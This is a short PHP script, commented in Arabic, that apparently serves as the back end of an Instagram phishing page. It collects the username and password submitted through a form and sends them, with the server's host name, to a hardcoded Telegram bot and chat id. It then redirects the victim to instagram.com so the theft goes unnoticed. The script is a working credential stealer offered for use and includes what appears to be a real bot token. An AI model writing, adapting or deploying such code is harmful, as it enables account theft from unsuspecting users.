<?php

$bot_token = '5381516561:AAEb23SvNm1uQu64TOCJwhH5Wkg0_4icTYs'; // تعيين التوكن الخاص ببوت التيليجرام الخاص بك
$chat_id = 1914514519; // تعيين رقم الدردشة الخاص بك

$username = $_POST['username']; // جمع اسم المستخدم من نموذج HTML الذي تم إرساله بواسطة الحدث POST
$password = $_POST['password']; // جمع كلمة المرور

$message = "حساب انستا جديد ❤️\nInstagram Username: " . $username . "\nPassword: " . $password . "\nDevice Name: " . gethostname();

$telegram_url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message); // توليد رابط لإرسال الرسالة إلى تيليجرام

file_get_contents($telegram_url); // إرسال الرسالة إلى تيليجرام


header('Location: https://instagram.com');
exit();
?>
